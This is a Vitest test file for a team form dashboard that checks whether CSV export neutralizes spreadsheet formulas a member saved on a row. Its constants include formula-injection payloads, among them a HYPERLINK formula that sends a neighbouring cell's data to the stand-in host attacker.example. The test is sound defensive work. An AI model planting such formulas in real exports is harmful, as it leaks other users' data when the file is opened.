import { describe, it, expect, afterEach } from 'vitest';
import { syncFormToTeam } from '../../src/api/team';
import { captureDownload } from '../helpers/capture-download';
import { columnValue, expectNeutralized, parseCsv } from '../helpers/csv-formula';
import { TeamApiDouble, installTeamApi } from '../helpers/team-api-double';
import '../../src/dashboard/team/index';

const ATTACKER = 'user-attacker';
const VICTIM = 'user-victim';
const FORM_NAME = '=HYPERLINK("http://attacker.example/x?d="&B2)';
const ENTITY = '+2+2';
const ACTION = '-2-2';
const PURPOSE = '@SUM(A1:A2)';

function installCssEscape(): void {
  const css = (globalThis.CSS ?? { escape: undefined }) as { escape?: (value: string) => string };
  if (typeof css.escape !== 'function') {
    css.escape = (value: string) => String(value).replace(/[^a-zA-Z0-9_-]/g, ch => `\\${ch}`);
    globalThis.CSS = css as typeof CSS;
  }
}

function mount(): void {
  document.body.innerHTML = `
    <button id="refreshDashboard" type="button">Refresh</button>
    <button id="viewMyForms" type="button">My Forms Only</button>
    <button id="exportAllCSV" type="button">Export CSV</button>
    <input id="searchInput" />
    <select id="filterSelect"><option value="all" selected>All Forms</option></select>
    <span id="formCount"></span>
    <div id="loadingState"></div>
    <div id="emptyState"></div>
    <div id="bulkActions"></div>
    <span id="selectedCountDisplay"></span>
    <table id="formsTable">
      <thead><tr id="tableHeaderRow"></tr></thead>
      <tbody id="formsTableBody"></tbody>
    </table>
  `;
}

async function openDashboard(): Promise<void> {
  mount();
  document.dispatchEvent(new Event('DOMContentLoaded'));
  await vi.waitFor(() => {
    expect(document.getElementById('formCount')?.textContent).toBe('2 forms');
  });
}

describe('team dashboard edit to CSV export', () => {
  afterEach(() => {
    vi.unstubAllGlobals();
    document.body.innerHTML = '';
  });

  it('neutralizes formula text a member saves on their row before a teammate export', async () => {
    const store = new TeamApiDouble();
    installTeamApi(store);
    installCssEscape();
    vi.stubGlobal('alert', vi.fn());
    await chrome.storage.local.set({ userId: ATTACKER });

    const synced = await syncFormToTeam({
      user_id: ATTACKER,
      analysis_id: 'local-attacker',
      form_data: {
        form_name: 'Benefits enrollment',
        entity_name: 'Example Agency',
        source_url: 'https://example.test/forms/benefits.pdf',
        action_type: 'Submit',
        form_purpose: 'Enroll',
        pages: 2,
        total_field_count: 8,
        complexity_score: 3,
        confidence_tier: 'High',
        signature_required: false,
      },
    });
    expect(synced).toBe(true);

    await syncFormToTeam({
      user_id: VICTIM,
      analysis_id: 'local-victim',
      form_data: {
        form_name: 'Quarterly Bonus Schedule',
        entity_name: 'Example Agency',
        source_url: 'https://example.test/forms/bonus.pdf',
        action_type: 'File',
        form_purpose: 'Compensation',
        pages: 1,
        complexity_score: 2,
      },
    });

    await openDashboard();

    const edit = document.querySelector<HTMLButtonElement>('.edit-btn');
    expect(edit).toBeTruthy();
    const row = edit!.closest('tr');
    expect(row).toBeTruthy();
    edit!.click();
    const analysisId = row!.dataset.analysisId ?? '';
    expect(analysisId).not.toBe('');

    const setField = (name: string, value: string) => {
      const input = row!.querySelector<HTMLInputElement>(`input[name="${name}"]`);
      expect(input, name).toBeTruthy();
      input!.value = value;
    };
    setField('form_name', FORM_NAME);
    setField('entity_name', ENTITY);
    setField('action_type', ACTION);
    setField('form_purpose', PURPOSE);

    row!.querySelector<HTMLButtonElement>('.save-btn')!.click();
    await vi.waitFor(() => {
      expect(alert).toHaveBeenCalledWith('Form updated successfully!');
    });

    // The list route derives llm_model from metadata the update route does not rewrite.
    // Seeing the new label after Refresh shows the export was built from the fetched row.
    store.setGeminiAnalyzed(analysisId, false);
    document.getElementById('refreshDashboard')!.click();
    await vi.waitFor(() => {
      expect(document.body.textContent).toContain('Claude 3 Opus');
    });

    const download = await captureDownload(() => {
      document.getElementById('exportAllCSV')!.click();
    });

    expect(download.filename).toMatch(/^Team_Forms_\d{4}-\d{2}-\d{2}\.csv$/);
    expect(download.type).toContain('text/csv');

    const rows = parseCsv(download.content);
    const records = rows.slice(1);
    expect(records).toHaveLength(2);

    const attacker = records.find(record => columnValue(rows, 'User ID', record) === ATTACKER);
    const victim = records.find(record => columnValue(rows, 'User ID', record) === VICTIM);
    expect(attacker).toBeTruthy();
    expect(victim).toBeTruthy();

    expectNeutralized(columnValue(rows, 'Form Name', attacker!), FORM_NAME);
    expectNeutralized(columnValue(rows, 'Entity', attacker!), ENTITY);
    expectNeutralized(columnValue(rows, 'Action Type', attacker!), ACTION);
    expectNeutralized(columnValue(rows, 'Purpose', attacker!), PURPOSE);
    expect(columnValue(rows, 'LLM Model', attacker!)).toBe('Claude 3 Opus');
    expect(columnValue(rows, 'Form Name', victim!)).toBe('Quarterly Bonus Schedule');
  });
});
